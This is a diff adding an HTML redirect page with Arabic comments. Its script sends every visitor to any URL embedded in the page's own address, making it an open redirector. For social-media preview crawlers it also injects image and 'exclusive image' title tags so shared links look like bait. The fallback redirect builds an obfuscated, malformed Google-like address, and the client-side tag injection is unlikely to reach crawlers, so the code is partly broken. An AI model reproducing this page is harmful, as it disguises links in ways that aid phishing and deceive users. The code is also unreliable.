@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <script>
+        // 1. قراءة المسار أو الاستعلام من الرابط أوتوماتيك
+        const fullPath = window.location.pathname + window.location.search + window.location.hash;
+        
+        // استخراج أي رابط يبدأ بـ http من النص المكتوب
+        const match = fullPath.match(/(https?:\/\/.+)/i);
+        const targetUrl = match ? decodeURIComponent(match[1]) : "";
+
+        // 2. فحص هل الزائر بوت معاينة (فيسبوك، واتساب، تويتر، إلخ)
+        const userAgent = navigator.userAgent || "";
+        const isBot = /facebookexternalhit|Facebot|Twitterbot|Googlebot|LinkedInBot|WhatsApp|Bluesky|MetaInspector/i.test(userAgent);
+
+        if (targetUrl) {
+            if (isBot) {
+                // لو بوت: بنحط لزقة الـ Open Graph في الظهر عشان الصورة والمعاينة تظهر في منصة التواصل
+                let metaImage = document.createElement('meta');
+                metaImage.setAttribute('property', 'og:image');
+                metaImage.setAttribute('content', targetUrl);
+                document.head.appendChild(metaImage);
+
+                let metaTitle = document.createElement('meta');
+                metaTitle.setAttribute('property', 'og:title');
+                metaTitle.setAttribute('content', 'صورة حصريّة');
+                document.head.appendChild(metaTitle);
+
+                // إعادة توجيه سريعة للبوت
+                setTimeout(() => {
+                    window.location.replace(targetUrl);
+                }, 100);
+            } else {
+                // لو إنسان بشري ومعاه رابط: يروح على الهدف أوتوماتيك (أو تغيرها للدالة العشوائية لو حابب)
+                window.location.replace(targetUrl);
+            }
+        } else {
+            // 3. لو مفيش رابط، يشتغل التحويل العشوائي الأصلي بتاعك للإنسان
+            const a = "goog";
+            const b = ".le";
+            const c = "..com?";
+            const d = Math.ceil(Math.random() * 24);
+            const finalUrl = "https://" + a + b + c + d;
+            window.location.replace(finalUrl);
+        }
+    </script>
+</head>
+<body>
+    <p>Jumping...</p>
+</body>
+</html>
